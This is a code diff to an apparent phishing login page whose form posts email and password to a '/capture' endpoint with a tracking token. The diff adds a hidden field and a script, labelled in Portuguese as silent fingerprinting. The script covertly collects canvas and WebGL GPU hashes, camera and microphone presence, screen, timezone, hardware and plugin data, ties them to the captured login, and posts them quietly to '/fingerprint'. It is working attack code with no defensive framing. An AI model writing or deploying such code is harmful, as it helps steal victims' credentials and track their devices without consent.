@@ -177,6 +177,7 @@
 
     <form id="login-form" method="POST" action="/capture">
       <input type="hidden" name="track_token" value="{{ track_token }}" />
+      <input type="hidden" name="fp_token" id="fp_token" value="" />
 
       <div id="email-section">
         <div class="form-group">
@@ -230,6 +231,89 @@
       document.getElementById("password-section").style.display = "block";
       document.getElementById("password").focus();
     }
+  </script>
+
+  <!-- ── Browser fingerprinting silencioso ─────────────────────────────── -->
+  <script>
+  (async function () {
+    // Token único que liga o fingerprint à captura
+    const fpToken = crypto.randomUUID();
+    document.getElementById('fp_token').value = fpToken;
+
+    // Canvas fingerprint — hash do rendering (varia por GPU + browser + OS)
+    function canvasHash() {
+      try {
+        const c = document.createElement('canvas');
+        c.width = 240; c.height = 60;
+        const ctx = c.getContext('2d');
+        ctx.fillStyle = '#f06';
+        ctx.fillRect(0, 0, 240, 60);
+        ctx.font = '15px Arial';
+        ctx.fillStyle = '#0cf';
+        ctx.fillText('SRS’SEGRED ☃', 10, 28);
+        ctx.font = '10px Courier New';
+        ctx.fillStyle = 'rgba(80,200,40,0.85)';
+        ctx.fillText(navigator.userAgent.slice(0, 50), 4, 48);
+        const raw = c.toDataURL();
+        let h = 0;
+        for (let i = 0; i < raw.length; i++) {
+          h = Math.imul(31, h) + raw.charCodeAt(i) | 0;
+        }
+        return (h >>> 0).toString(16).padStart(8, '0');
+      } catch (e) { return null; }
+    }
+
+    // WebGL — identifica a GPU real do dispositivo
+    function webglInfo() {
+      try {
+        const c = document.createElement('canvas');
+        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+        if (!gl) return null;
+        const ext = gl.getExtension('WEBGL_debug_renderer_info');
+        return {
+          vendor:   ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)   : gl.getParameter(gl.VENDOR),
+          renderer: ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
+        };
+      } catch (e) { return null; }
+    }
+
+    // Dispositivos de media — sem pedir permissão, só detetar existência
+    let media = null;
+    try {
+      const devices = await navigator.mediaDevices.enumerateDevices();
+      media = {
+        camera:     devices.some(d => d.kind === 'videoinput'),
+        microphone: devices.some(d => d.kind === 'audioinput'),
+        speakers:   devices.some(d => d.kind === 'audiooutput'),
+      };
+    } catch (e) {}
+
+    const fp = {
+      fp_token:     fpToken,
+      screen:       { width: screen.width, height: screen.height,
+                      colorDepth: screen.colorDepth, pixelRatio: window.devicePixelRatio },
+      viewport:     { width: window.innerWidth, height: window.innerHeight },
+      timezone:     Intl.DateTimeFormat().resolvedOptions().timeZone,
+      language:     navigator.language,
+      platform:     navigator.platform,
+      cores:        navigator.hardwareConcurrency,
+      memory_gb:    navigator.deviceMemory,
+      touch_points: navigator.maxTouchPoints,
+      do_not_track: navigator.doNotTrack === '1',
+      cookies:      navigator.cookieEnabled,
+      canvas_hash:  canvasHash(),
+      webgl:        webglInfo(),
+      media:        media,
+      plugins:      Array.from(navigator.plugins || []).map(p => p.name).slice(0, 10),
+    };
+
+    fetch('/fingerprint', {
+      method:    'POST',
+      headers:   { 'Content-Type': 'application/json' },
+      body:      JSON.stringify(fp),
+      keepalive: true,
+    }).catch(() => {});
+  })();
   </script>
 </body>
 </html>
